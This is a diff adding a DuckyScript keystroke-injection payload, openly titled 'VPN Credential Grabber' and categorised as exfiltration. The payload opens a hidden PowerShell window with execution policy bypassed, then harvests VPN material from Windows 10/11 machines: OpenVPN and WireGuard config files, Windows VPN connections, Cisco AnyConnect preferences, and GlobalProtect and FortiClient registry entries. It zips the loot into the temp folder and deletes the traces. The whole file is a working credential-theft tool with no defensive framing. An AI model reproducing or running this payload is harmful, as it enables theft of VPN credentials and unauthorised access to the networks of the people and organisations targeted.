@@ -1,0 +1,70 @@
+REM =============================================
+REM Title: VPN Credential Grabber
+REM Author: bad-antics
+REM Description: Extract VPN configs and credentials
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\vpnloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Extract OpenVPN configs
+STRING if(Test-Path "$env:USERPROFILE\OpenVPN\config"){cp -r "$env:USERPROFILE\OpenVPN\config\*" "$d\openvpn\" -Force}
+ENTER
+DELAY 200
+
+STRING if(Test-Path "C:\Program Files\OpenVPN\config"){cp -r "C:\Program Files\OpenVPN\config\*" "$d\openvpn_global\" -Force}
+ENTER
+DELAY 200
+
+REM Extract WireGuard configs
+STRING if(Test-Path "C:\Program Files\WireGuard\Data\Configurations"){cp -r "C:\Program Files\WireGuard\Data\Configurations\*" "$d\wireguard\" -Force}
+ENTER
+DELAY 200
+
+REM Windows VPN connections
+STRING Get-VpnConnection -AllUserConnection 2>$null|Out-File "$d\win_vpn_all.txt"
+ENTER
+DELAY 200
+
+STRING Get-VpnConnection 2>$null|Out-File "$d\win_vpn_user.txt"
+ENTER
+DELAY 200
+
+REM Cisco AnyConnect profiles
+STRING if(Test-Path "$env:LOCALAPPDATA\Cisco\Cisco AnyConnect Secure Mobility Client\preferences.xml"){cp "$env:LOCALAPPDATA\Cisco\Cisco AnyConnect Secure Mobility Client\preferences.xml" "$d\anyconnect_prefs.xml"}
+ENTER
+DELAY 200
+
+REM GlobalProtect settings
+STRING if(Test-Path "HKLM:\SOFTWARE\Palo Alto Networks\GlobalProtect\PanSetup"){Get-ItemProperty "HKLM:\SOFTWARE\Palo Alto Networks\GlobalProtect\PanSetup"|Out-File "$d\globalprotect.txt"}
+ENTER
+DELAY 200
+
+REM FortiClient VPN
+STRING if(Test-Path "HKCU:\Software\Fortinet\FortiClient\Sslvpn\Tunnels"){Get-ChildItem "HKCU:\Software\Fortinet\FortiClient\Sslvpn\Tunnels"|%{Get-ItemProperty $_.PSPath}|Out-File "$d\forticlient.txt"}
+ENTER
+DELAY 200
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\vpn_$(hostname).zip" -Force
+ENTER
+DELAY 400
+
+REM Cleanup
+STRING Remove-Item $d -Recurse -Force
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
